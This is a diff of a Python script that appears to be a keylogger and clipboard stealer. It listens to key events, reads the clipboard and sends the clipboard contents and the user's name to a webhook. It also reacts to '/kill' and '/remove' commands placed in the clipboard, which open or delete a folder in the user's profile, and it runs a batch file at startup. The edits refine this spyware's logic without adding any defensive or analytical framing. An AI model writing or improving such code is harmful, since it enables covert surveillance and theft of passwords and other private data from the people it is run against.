@@ -91,27 +91,31 @@ def on_press(key):
 
 
 def on_release(key):
-    current_clipboard = ""
+    global last_clipboard
+    # Don't perform any action until a significant clipboard change is detected
     current_clipboard = pyperclip.paste()
 
-    if "/kill" in current_clipboard:
-        send_to_webhook(f"Kill command executed by: {username}")
-        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
-        subprocess.run(["explorer", file_path])
-        time.sleep(1)
-        send_to_webhook(f"Opened dir...")
-        return False
+    if current_clipboard != last_clipboard:
+        last_clipboard = current_clipboard
+        if "/kill" in current_clipboard:
+            send_to_webhook(f"Kill command executed by: {username}")
+            file_path = rf"C:\users\{username}\kl2.1"
+            subprocess.run(["explorer", file_path])
+            time.sleep(1)
+            send_to_webhook(f"Opened dir...")
+            return False
 
-    elif "/remove" in current_clipboard:  # Corrected from 'else if' to 'elif'
-        send_to_webhook(f"Removed by: {username}")
-        file_path = rf"C:\users\{username}\kl2.1"
-        try:
-            os.rmdir(file_path)
-            send_to_webhook(f"Directory removed: {file_path}")
-        except OSError as e:
-            send_to_webhook(f"Error removing directory: {e}")
-        return False
+        elif "/remove" in current_clipboard:
+            send_to_webhook(f"Removed by: {username}")
+            file_path = rf"C:\users\{username}\kl2.1"
+            try:
+                os.rmdir(file_path)
+                send_to_webhook(f"Directory removed: {file_path}")
+            except OSError as e:
+                send_to_webhook(f"Error removing directory: {e}")
+            return False
 
+    return True
 
 def monitor_clipboard():
     """Monitor the clipboard for changes and send the content to the webhook."""
@@ -121,11 +125,12 @@ def monitor_clipboard():
         try:
             current_clipboard = pyperclip.paste()
             if current_clipboard != last_clipboard:
-                send_to_webhook(f" {username} just copied something to clipboard!")
+                send_to_webhook(f"{username} just copied something to clipboard!")
                 send_to_webhook(f"Clipboard content: {current_clipboard}")
                 last_clipboard = current_clipboard
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
+
 
 # Run kill.bat file at the start
 run_bat_file()
